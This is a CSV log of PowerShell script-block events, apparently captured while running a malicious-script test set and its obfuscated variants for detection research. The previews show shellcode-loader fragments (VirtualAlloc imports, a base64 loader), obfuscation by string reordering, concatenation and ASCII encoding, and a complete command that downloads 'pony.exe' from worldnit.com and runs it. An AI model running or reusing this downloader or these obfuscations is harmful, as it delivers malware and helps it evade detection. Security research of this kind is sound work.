"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:34:39 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1827.ps1","2928"," ((""{25}{2}{9}{31}{44}{30}{6}{0}{50}{55}{40}{21}{14}{41}{68}{22}{24}{37}{34}{49}{48}{28}{54}{66}{4}{42}{39}{38}{51}{61}{47}{59}{16}{35}{56}{17}{10}{15}{43}{29}{5}{18}{63}{32}{23}{8}{19}{64}{3}{36}{65}"
"8/6/2026 10:34:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:31 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1827.ps1","2684",". ((get-vARiAbLE '*MDr*').nAME[3,11,2]-JoiN'') ( (('TWyc = nki[DllImport(lz2kernel32.dlllz2)]public static exter'+'n IntPtr Vir'+'tu'+'alAlloc(In'+'tPtr lpAddre'+'ss, uint dwSize, uint f'+'lAllocation"
"8/6/2026 10:34:23 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:23 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:23 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1827.ps1","9793","[cHAR[]] ( 36, 99 ,32 ,61 , 32, 39 ,91, 68 ,108 , 108,73,109 , 112, 111, 114, 116 , 40, 34 , 107, 101 ,114 ,110,101,108, 51 ,50 , 46,100 ,108 , 108 ,34 , 41,93, 112 , 117 , 98 , 108, 105 ,99 , 32,115 "
"8/6/2026 10:34:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:15 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1827.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:34:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:34:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:34:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:34:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:34:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1822.ps1","2337","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:33:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:59 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1822.ps1","3070",". ( $psHoMe[4]+$PsHoMe[34]+'x')( ((""{33}{47}{20}{29}{39}{23}{70}{18}{26}{55}{3}{1}{13}{58}{46}{40}{71}{52}{69}{14}{42}{19}{6}{54}{30}{72}{27}{21}{57}{60}{5}{10}{66}{17}{34}{63}{67}{59}{44}{0}{24}{36}{"
"8/6/2026 10:33:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:51 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:51 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1822.ps1","2748","(('pI4fhA = ESY[DllImp'+'ort(m3kkernel32.dllm3k)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dw'+'S'+'ize, uint '+'flAllocationType, uint flProtect);[DllImport(m3kkernel32.dllm3k)]"
"8/6/2026 10:33:43 AM","","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1822.ps1","22","{ ([iNT] $_-AS[CHAR])}"
"8/6/2026 10:33:43 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1822.ps1","8022"," -Join('36l102c104H65W32l61d32-39H91H68j108N108W73c109l112l111l114j116s40c34c107H101l114-110l101j108c51H50N46H100l108j108H34H41l93N112c117W98c108c105j99s32l115l116d97W116d105j99N32H101W120-116c101j114"
"8/6/2026 10:33:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:33:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:33:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:33:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:33:35 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1822.ps1","2331","$fhA = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:33:27 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:27 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1811.ps1","2299","$s=Ne`W`-OBJe`cT IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHN"
"8/6/2026 10:33:18 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:18 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1811.ps1","2724","INVOKE-eXPrEsSiOn ((((""{40}{7}{10}{25}{20}{29}{17}{41}{23}{15}{14}{0}{18}{38}{42}{9}{30}{3}{26}{8}{24}{11}{43}{35}{27}{39}{37}{32}{2}{19}{1}{46}{6}{12}{33}{36}{22}{4}{21}{28}{34}{16}{31}{13}{44}{45}{5"
"8/6/2026 10:33:10 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:10 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:10 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1811.ps1","2583","(('{1}s=New-Object IO.MemoryStream(,[Convert]::FromBase64Stri'+'ng({0}H4sIAA'+'AAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6'+'V1Olc6'+'SxXp3ZnbmN08sKi8sGTBbmoJQ5'+'WJMg5"
"8/6/2026 10:33:02 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:33:02 AM","","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:33:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1811.ps1","20","{ ( [chAR] [InT]$_)}"
"8/6/2026 10:33:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1811.ps1","7810",".((Gv '*mDr*').nAME[3,11,2]-JOiN'') ( -Join ( '36<115q61d78s101q119:45s79E98E106&101:99d116q32&73d79}46&77P101P109s111P114<121P83P116q114<101%97P109}40}44}91&67:111d110q118:101:114d116%93&58<58<70s114"
"8/6/2026 10:32:54 AM","","3330","Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {"
"8/6/2026 10:32:54 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1811.ps1","2288","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(""H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wCCRNK1XqAjGPYkIwr4RDaPGuzYa1l9prHr32u9/4QUsv6V1Olc6SxXp3ZnbmN08sKi8sGTBbmoJQ5WJMg5AJX7nM5c4boi2V98oHNedE"
"8/6/2026 10:32:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1810.ps1","2341","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:38 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:38 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1810.ps1","3113","& ( $PsHOmE[4]+$psHOME[30]+'X') ( ((""{46}{38}{50}{11}{44}{53}{34}{56}{0}{39}{3}{1}{42}{41}{61}{36}{29}{21}{19}{66}{31}{16}{6}{2}{70}{65}{33}{40}{27}{54}{13}{37}{14}{64}{26}{17}{22}{23}{48}{8}{24}{28}{"
"8/6/2026 10:32:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:30 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:30 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1810.ps1","2798"," inVOKE-eXPResSioN( ('NEUuLJcb = qI1[DllImport(Uwakernel32.dllUwa)]public sta'+'tic e'+'xtern IntPtr Virtu'+'alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType,'+' uint flProtect);[DllImport"
"8/6/2026 10:32:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:22 AM","","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1810.ps1","19","{ ([char][inT] $_)}"
"8/6/2026 10:32:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1810.ps1","7959"," &( $PShOMe[21]+$pshomE[30]+'X') ( [sTRING]::JoIN('' ,('36}117L76n74%99L98L32O61!32%39{91q68{108}108{73!109%112g111q114@116}40%34@107!101O114q110O101@108g51@50!46g100{108q108g34L41O93@112%117L98{108}1"
"8/6/2026 10:32:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:14 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1810.ps1","2335","$uLJcb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntP"
"8/6/2026 10:32:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:32:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:32:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:32:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:32:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1764.ps1","127","(n`E`w-obJEcT System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');ST`Ar`T-pRO`CESS 'fleeble.exe'
"
"8/6/2026 10:31:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:58 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1764.ps1","328","iNvOKe-EXpreSSIon ((((""{14}{3}{8}{5}{2}{18}{19}{10}{7}{20}{12}{4}{11}{0}{16}{9}{15}{17}{6}{1}{13}"" -f 'ony.exeEL7,EL7fleeble.','E','i','ect System.Net.WebClient','t','wnloadF','eeble.exe','tp://wor','"
"8/6/2026 10:31:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:50 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1764.ps1","286"," & ((get-VARIAble '*MDR*').nAmE[3,11,2]-JOiN'') ( (('('+'New-Object S'+'y'+'stem.N'+'et.W'+'ebC'+'lient'+').Down'+'loadF'+'ile({'+'0'+'}htt'+'p://w'+'orldnit'+'.com/pon'+'y'+'.exe'+'{0},{0}fleebl'+'e."
"8/6/2026 10:31:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:42 AM","","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1764.ps1","22","{( [Int]$_ -As[CHAr])}"
"8/6/2026 10:31:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1764.ps1","666"," [StRINg]::JOIn( '' , ( ( 40,78 , 101, 119, 45,79 ,98 ,106 , 101, 99,116,32 ,83, 121 , 115,116, 101, 109 , 46, 78 , 101 ,116 ,46 , 87, 101,98 ,67 , 108 , 105 ,101 , 110,116, 41,46,68 , 111, 119, 110,1"
"8/6/2026 10:31:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:33 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1764.ps1","120","(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'"
"8/6/2026 10:31:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
